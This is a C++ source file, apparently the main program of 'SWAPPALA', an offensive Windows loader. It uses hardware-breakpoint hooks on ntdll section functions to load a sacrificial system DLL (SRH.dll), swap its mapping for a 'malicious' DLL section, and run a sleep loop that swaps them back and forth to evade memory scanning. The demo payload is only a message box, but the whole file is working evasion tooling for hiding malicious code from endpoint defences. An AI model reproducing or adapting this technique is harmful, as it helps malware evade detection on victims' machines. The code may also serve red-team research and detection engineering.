// SWAPPALA.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "misc.h"
#include "swappala.h"
#include "HBP.h"
#include "headers.h"
#include "globals.h"
#include "handlesenum.h"


BOOL InitializeFunctionAddress(PFUNCTION_ADDRESSES fnAddr) {
    // handle to ntdll and user32
    HMODULE hNtdll = { 0 };
    HMODULE hUser32 = { 0 };
    HMODULE hKernel32 = { 0 };
    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        return FALSE;
    }
    if (!(hUser32 = GetModuleHandleA("user32.dll"))) {
        return FALSE;
    }
    if (!(hKernel32 = GetModuleHandleA("kernel32.dll"))) {
        return FALSE;
    }
    // function pointers for thread contexts
    fnAddr->NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
    fnAddr->NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    fnAddr->MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
    fnAddr->ResumeThreadAddress = GetProcAddress(hKernel32, "ResumeThread");

    if (fnAddr->NtTestAlertAddress == NULL || fnAddr->NtWaitForSingleObjectAddress == NULL || fnAddr->MessageBoxAddress == NULL || fnAddr->ResumeThreadAddress == NULL) {
        return FALSE;
    }


    return TRUE;
}

BOOL InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
{
    // Load the ntdll.dll library
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL)
    {

        return FALSE;
    }

    ntFunctions->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hNtdll, "NtWaitForSingleObject");//
    ntFunctions->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hNtdll, "NtQueueApcThread");//
    ntFunctions->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hNtdll, "NtGetContextThread");//
    ntFunctions->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hNtdll, "NtSetContextThread");//
    ntFunctions->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx"); // Added
    ntFunctions->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
    ntFunctions->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hNtdll, "NtResumeThread");//

    // Check if all function addresses were retrieved successfully
    if (!ntFunctions->NtResumeThread || !ntFunctions->NtWaitForSingleObject || !ntFunctions->NtQueueApcThread ||
        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent) // Modified
    {

        return FALSE;
    }

    return TRUE;
}

VOID CoreFunction(LPVOID lpParam) {

    PCORE_ARGUMENTS CoreArguments = NULL;
    CoreArguments = (PCORE_ARGUMENTS)lpParam;

    //here i need to initialize all the NtFunctions 
    PNT_FUNCTIONS ntFunctions = (PNT_FUNCTIONS)VirtualAlloc(NULL, sizeof(NT_FUNCTIONS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!InitializeNtFunctions(ntFunctions))
    {
        return;
    }
    PFUNCTION_ADDRESSES fnAddr = (PFUNCTION_ADDRESSES)VirtualAlloc(NULL, sizeof(FUNCTION_ADDRESSES), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!InitializeFunctionAddress(fnAddr)) {

        return;
    }

    //looping and Sleaping <3
    do {
        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize, ntFunctions, fnAddr) == -1) {
            //nightmares
            MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
            return;
        }


    } while (TRUE);

}


int main()
{
    //variables
    CHAR SRHPATH[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
    PVOID ZwCloseAddress = NULL;
    PVOID NtMapViewOfSectionAddress = NULL;
    PVOID NtCreateSectionAddress = NULL;
    HMODULE NTDLL = NULL;
    HMODULE SRHMODULE = NULL;
    HANDLE SRHHANDLE = NULL;
    PBYTE SRHBASE = NULL;
    SIZE_T SRHSIZE = NULL;
    HANDLE MALHANDLE = NULL;
    BYTE SWAPPALA[] = { 0x53, 0x57, 0x41, 0x50, 0x50, 0x41, 0x4C, 0x41, 0x00 };


    //retrieve the needed syscalls
    RetrieveZwFunctions(GetModuleHandleA("ntdll.dll"), zwFunctions);

    //set hardware breakpoints
    
    AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    NTDLL = GetModuleHandleA("ntdll.dll");
    if (NTDLL != NULL) {
        ZwCloseAddress = GetProcAddress(NTDLL, "ZwClose");
        NtMapViewOfSectionAddress = GetProcAddress(NTDLL, "NtMapViewOfSection");
        NtCreateSectionAddress = GetProcAddress(NTDLL, "NtCreateSection");


        if (ZwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL) {
            setHardwareBreakpoint(ZwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress);

        }
        else {
            printf("[-] Failed retrieving the addresses of functions to be hooked\n");
        }
    }
    
    //load sacrifical dll
    SRHMODULE = LoadLibraryExA(SRHPATH,NULL, DONT_RESOLVE_DLL_REFERENCES);

    //remove hardware breakpoint
    unsetHardwareBreakpoint(1);
    unsetHardwareBreakpoint(2);
    unsetHardwareBreakpoint(3);

    RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

    
    if (SRHMODULE != NULL) {
        //retrieve sacrificial DLL handle
        SRHHANDLE = FindSectionHandle(zwFunctions);
        if (SRHHANDLE != NULL) {
        
            printf("[+] Successfully retrieve the Section handle: %p\n", SRHHANDLE);
            
        }
    }
    else {
    
        printf("[-] Error while loading the sacrificial DLL\n");
        return;
    }

    
    //create space and unmap sacrificial dll
    SRHSIZE = RetrieveModuleSize((PBYTE) SRHMODULE);
    MALHANDLE = SwapDll(SRHSIZE,(PVOID) SRHMODULE);
    if (MALHANDLE == NULL) {

        printf("[-] Error while swapping DLLs \n");
        
    }
    memcpy(SRHMODULE, SWAPPALA, sizeof(SWAPPALA));
    

    PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    CoreArguments->myBase = SRHMODULE;
    CoreArguments->sacDLLHandle = SRHHANDLE;
    CoreArguments->malDLLHandle = MALHANDLE;
    CoreArguments->viewSize = SRHSIZE;

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreFunction, CoreArguments, 0, NULL);

    if (hThread != NULL) {

        //saying goodbye to the loader thread
        ExitThread(0);
    }
   
}
